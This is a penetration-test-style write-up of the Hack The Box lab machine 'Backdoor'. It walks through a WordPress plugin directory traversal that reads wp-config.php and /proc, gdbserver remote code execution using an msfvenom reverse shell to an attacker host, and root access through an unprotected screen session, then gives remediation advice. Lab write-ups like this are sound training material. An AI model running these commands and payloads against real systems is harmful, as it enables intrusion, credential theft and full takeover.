# Penetration Test Report — Backdoor

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-LFI%20%2F%20gdbserver%20%2F%20screen-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` identified a WordPress plugin (ebook-download 1.1) vulnerable to directory traversal. Arbitrary file reads exposed database credentials and, by brute-forcing `/proc/<PID>/cmdline`, revealed a **gdbserver** instance on port 1337. A public gdbserver RCE exploit provided a foothold. Privilege escalation was achieved by attaching to a root-owned, unprotected **screen** session — yielding full root access.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Directory traversal in WordPress ebook-download 1.1 plugin | High |
| 2 | Directory listing enabled on `/wp-content/plugins/` | Low |
| 3 | gdbserver 9.2 exposed with remote code execution | Critical |
| 4 | Root-owned detached screen session attachable by unprivileged user | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
echo "target.htb backdoor.htb" | sudo tee -a /etc/hosts
```

SSH (22), Apache (80, WordPress), and an unidentified service on **1337**. The plugins directory listing was exposed; `ebook-download` version 1.1 was identified via its `readme.txt`.

### 2. Directory Traversal

A public PoC reads arbitrary files via the `ebookdownloadurl` parameter:

```
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

`wp-config.php` leaked DB credentials (`wordpressuser` / `MQYBJSaD#DxG6qbm`); `/etc/passwd` confirmed user `user`.

### 3. Identifying Port 1337 via /proc

The traversal was used to brute-force `/proc/<PID>/cmdline` over PID range 1–1000:

```python
import requests
for i in range(1, 1000):
    r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/"
                     "filedownload.php?ebookdownloadurl=/proc/" + str(i) + "/cmdline")
    out = (r.text.replace('/proc/' + str(i) + '/cmdline', '')
                 .replace('<script>window.close()</script>', '').replace('\00', ' '))
    if len(out) > 1:
        print("PID" + str(i) + " : " + out)
```

One process referenced port 1337:

```
sh -c while true; do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337 /bin/true"; done
```

### 4. Foothold — gdbserver RCE

A public exploit targets gdbserver 9.2 remote code execution:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 PrependFork=true -o rev.bin
nc -nvlp 4444
python3 gdb_rce.py target.htb:1337 rev.bin
```

Reverse shell as `user`; upgraded to TTY (`python3 -c "import pty;pty.spawn('/bin/bash')"`); user flag at `/home/user/user.txt`.

### 5. Privilege Escalation — Root screen Session

`ps aux` revealed a loop creating a detached **root** screen session whenever none existed:

```
find /var/run/screen/S-root -empty -exec screen -dmS root ;
```

Attaching to it:

```bash
export TERM=xterm
screen -x root/root
```

A root shell was presented; `/root/root.txt` recovered.

## Remediation

- Update/remove the ebook-download plugin; disable directory listing on webroots.
- Do not expose gdbserver (or any debugger) on the network; firewall port 1337.
- Restrict screen session directories (`/var/run/screen/S-*` permissions); avoid detached root sessions on multi-user systems.
- Restrict `/proc` visibility (`hidepid=2`) to limit process disclosure.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application |
| Discovery | T1057 — Process Discovery (via /proc) |
| Execution | T1059 — Command & Scripting Interpreter |
| Privilege Escalation | T1078 — Valid Accounts / session hijack of root screen |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
